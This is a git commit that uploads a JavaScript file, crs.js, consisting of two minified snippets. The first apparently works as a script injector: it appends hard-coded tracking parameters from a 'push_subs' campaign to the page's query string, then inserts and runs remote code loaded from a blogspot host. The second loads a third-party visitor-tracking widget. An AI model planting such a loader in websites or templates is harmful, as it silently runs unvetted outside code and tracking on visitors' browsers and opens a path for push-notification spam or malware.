28ba80d59f9e5f8111835acb16808c04a4f0ca04
Bloggeryte <72906459+Bloggeryte@users.noreply.github.com>
2020-10-15 10:40:22 +0500

    Add files via upload

---
+++ crs.js
@@ -0,0 +1,11 @@
+!function(t,e){for(var n,r,s={utm_campaign:"push_subs_07_08_2020_1755",cid:"",1:"",2:"",3:"",4:"",5:""},a=t.location.search.substr(1).split("&"),c=[];a.length;)r=a.shift(),n=r.split("=")[0],s.hasOwnProperty(n)&&(c.push(r),delete s[n]);for(n in s)s.hasOwnProperty(n)&&c.push(n+"="+encodeURIComponent(s[n]));c.length&&(e+=(/\?/.test(e)?"&":"?")+c.join("&"));var i=t.createElement("script");i.type="text/javascript",i.async=!0,i.src=e;var o=t.getElementsByTagName("script")[0];o.parentNode.insertBefore(i,o)}(document,"https://themedestroy.blogspot.com");
+
+
+
+var _wau = _wau || []; _wau.push(["small", "gnldu6ls8n", "i56"]);
+(function() {var s=document.createElement("script"); s.async=true;
+s.src="//whos.amung.us/swidget/gnldu6ls8n";
+document.getElementsByTagName("head")[0].appendChild(s);
+})();
+
+
